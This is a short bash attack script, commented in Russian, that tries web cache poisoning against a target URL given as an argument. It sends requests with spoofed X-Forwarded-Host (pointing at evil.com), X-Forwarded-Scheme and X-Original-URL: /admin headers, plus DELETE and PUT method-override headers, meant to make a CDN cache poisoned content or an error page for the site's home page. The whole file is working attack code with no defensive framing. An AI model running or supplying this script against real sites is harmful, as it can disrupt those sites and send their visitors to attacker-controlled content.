#!/bin/bash
TARGET=$1
echo "[POISON] Attempting cache poisoning..."

# Отправляем запросы с поддельными заголовками
for header in "X-Forwarded-Host: evil.com" "X-Forwarded-Scheme: http" "X-Original-URL: /admin"; do
    h_name="${header%%:*}"
    h_value="${header##*: }"
    curl -sk --max-time 5 -H "$h_name: $h_value" "$TARGET" -o /dev/null 2>/dev/null &
done

# Пробуем заставить CDN закэшировать 404 на главную
curl -sk --max-time 5 -H "X-HTTP-Method-Override: DELETE" "$TARGET" -o /dev/null 2>/dev/null &
curl -sk --max-time 5 -H "X-HTTP-Method-Override: PUT" "$TARGET" -o /dev/null 2>/dev/null &

wait
echo "[POISON] Cache may now serve poisoned content"
